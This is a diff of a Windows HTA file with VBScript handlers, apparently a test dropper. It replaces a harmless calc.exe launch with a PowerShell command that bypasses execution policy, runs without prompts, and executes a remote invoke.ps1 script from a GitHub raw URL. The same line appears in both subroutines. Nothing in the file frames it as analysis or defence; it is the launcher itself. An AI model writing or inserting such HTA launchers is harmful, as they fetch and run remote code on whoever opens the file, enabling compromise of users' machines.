@@ -1,6 +1,6 @@
 <!DOCTYPE HTA>
 <head>
-<title> TEST THIS </title>
+<title> TEST THIS SHIT </title>
 <HTA:Application
 	APPLICATIONNAME="HTA TEST"
 	SCROLL="yes"
@@ -13,14 +13,14 @@
 <script language="VBScript">
 Set objShell = CreateObject("Wscript.shell")
 	Sub TestSub
-		Msgbox "run this"
-		objShell.run("calc.exe")
+		Msgbox "run this shit"
+		objShell.run("powershell -Executionpolicy Bypass -nologo -noninteractive -file https://raw.githubusercontent.com/datoneguynamedsherman/Windows/master/invoke.ps1")
 		Window.Close()
 	End Sub
 
 	Sub Mine
-		Msgbox "don't run this"
-		objShell.run("calc.exe")
+		Msgbox "don't run this shit"
+		objShell.run("powershell -Executionpolicy Bypass -nologo -noninteractive -file https://raw.githubusercontent.com/datoneguynamedsherman/Windows/master/invoke.ps1")
 		Window.Close()
 	End Sub
 </script>
